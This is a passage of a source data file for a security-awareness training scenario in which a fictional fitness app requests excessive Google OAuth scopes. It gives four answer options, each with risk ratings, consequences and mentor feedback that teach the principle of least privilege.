        'OAuth Consent Screen:\n"KudoSprint wants to access your Google Account:\n• See, edit, create, and delete all of your Google Drive files\n• See your personal info and email\n• See and edit events on all your calendars\n• Read fitness and biometric history\n[ Allow ] [ Cancel ]"',
      clueCallout:
        'Overprivileged third-party OAuth integrations grant perpetual API tokens. Granting `drive` scope to a running app allows its servers to read and delete every document, syllabus, and private file stored in your cloud storage.',
      tags: ['OAuth Scope Overreach', 'Token Permissions', 'Cloud Storage Hijack', 'Least Privilege'],
    },
    options: [
      {
        id: 'A',
        label: 'Click "Allow" so you can join the training group leaderboard without delay.',
        description:
          'Authorize all scopes, assuming Google and Apple will block anything genuinely dangerous.',
        classification: 'dangerous',
        riskAssessment: 'HIGH',
        consequence:
          'KudoSprint’s cloud servers are compromised three months later. Attackers use the broad stored OAuth tokens to download all documents in your Google Drive, including tax returns and academic papers.',
        clueContext:
          'You granted unrestricted cloud storage and calendar modification scopes to an unvetted third-party fitness tool.',
        saferAction: 'Never grant broad cloud drive permissions to single-purpose sports or utility apps.',
      },
      {
        id: 'B',
        label: 'Click "Cancel", decline the integration, and report the overreaching scopes to the training group.',
        description:
          'Refuse the consent screen, warn your training partners about the dangerous Google Drive scope, and track workouts using native privacy-safe tools.',
        classification: 'secure',
        riskAssessment: 'LOW',
        consequence:
          'Your cloud files, personal calendars, and biometric data remain strictly private. Several classmates thank you for pointing out the dangerous Drive access request.',
        clueContext:
          'You reviewed the OAuth consent screen with critical scrutiny and enforced the Principle of Least Privilege.',
      },
      {
        id: 'C',
        label: 'Allow access, but delete your Google Drive files before running.',
        description:
          'Move your cloud files out of Drive temporarily each time you sync a workout.',
        classification: 'risky',
        riskAssessment: 'MEDIUM',
        consequence:
          'An absurdly impractical workflow that inevitably fails when files are forgotten, while still exposing your calendar and biometric data.',
        clueContext:
          'Manual file shifting is unsustainable and does not mitigate calendar or identity exposure.',
        saferAction: 'Deny overreaching OAuth applications at the consent boundary.',
      },
      {
        id: 'D',
        label: 'Click "Allow", but change your Google Account password right after connecting.',
        description:
          'Change your password believing it will invalidate the OAuth token permissions.',
        classification: 'risky',
        riskAssessment: 'MEDIUM',
        consequence:
          'Many OAuth 2.0 refresh tokens persist independently across standard password changes unless explicitly revoked in account security settings.',
        clueContext:
          'Changing passwords does not always revoke authorized third-party OAuth access tokens.',
        saferAction: 'Never grant excessive scopes in the first place.',
      },
    ],
    bestOptionId: 'B',
    securityPrinciple:
      'Always audit third-party OAuth consent screens. Never grant broad cloud storage (`drive`) or messaging access to single-purpose applications that have no legitimate requirement for those scopes.',
    learningObjective:
      'Critique OAuth 2.0 permission consent dialogs, detect excessive scope requests, and reject integrations that violate the Principle of Least Privilege.',
    deterministicFeedback: {
      A: {
        mentorVoice: 'Massive cloud security failure: you gave a fitness app the keys to your entire Google Drive.',
        whyExplanation:
          'Granting `drive` scope lets the third-party server read, edit, and delete every file stored in your cloud account.',
        realisticOutcome:
          'When the workout app suffered a database breach, all your private cloud documents were leaked online.',
        clueInsight:
          'A running tracker needs activity data, never permission to delete your cloud storage.',
        saferAction: 'Cancel any OAuth request that asks for unrelated cloud drive permissions.',
        principle: 'Never grant full cloud filesystem access to third-party utility applications.',
      },
      B: {
        mentorVoice: 'Brilliant application audit! You caught a severe scope overreach and protected your data.',
        whyExplanation:
          'OAuth scopes must match the application’s core purpose. Declining excessive permissions keeps cloud drives sealed.',
        realisticOutcome:
          'Your academic papers, personal tax forms, and calendar stayed private, and your group found a verified alternative.',
        clueInsight:
          'The inclusion of `drive` and `calendar` permissions was an egregious violation of least privilege.',
        saferAction: 'Regularly audit and prune connected apps in your Google/Apple security settings.',
        principle: 'Enforce strict scope proportionality on all third-party authorizations.',
      },
      C: {
        mentorVoice: 'Impractical and incomplete: manual file shuffling does not scale.',
        whyExplanation:
          'Constantly moving files is error-prone, exhausting, and leaves your calendar and contacts fully exposed.',
        realisticOutcome:
          'You forgot to move an internship contract, which was uploaded and indexed by the analytics service.',
        clueInsight:
          'Security policies must be automated and clean, not reliant on constant manual chores.',
        saferAction: 'Reject the app at the consent prompt.',
        principle: 'Do not compromise your workflow to accommodate overprivileged software.',
      },
      D: {
        mentorVoice: 'Technical misunderstanding: OAuth tokens survive password resets.',
        whyExplanation:
          'OAuth 2.0 tokens are decoupled from passwords and often remain valid until explicitly revoked in the security dashboard.',
        realisticOutcome:
          'The app retained access to your Google Drive despite your password update.',
        clueInsight:
          'Token revocation must be performed in third-party connected app settings, not via password reset.',
        saferAction: 'Deny the request initially; do not rely on post-connection remediation.',
        principle: 'OAuth tokens operate independently of password authentication cycles.',
      },
    },
  },
];
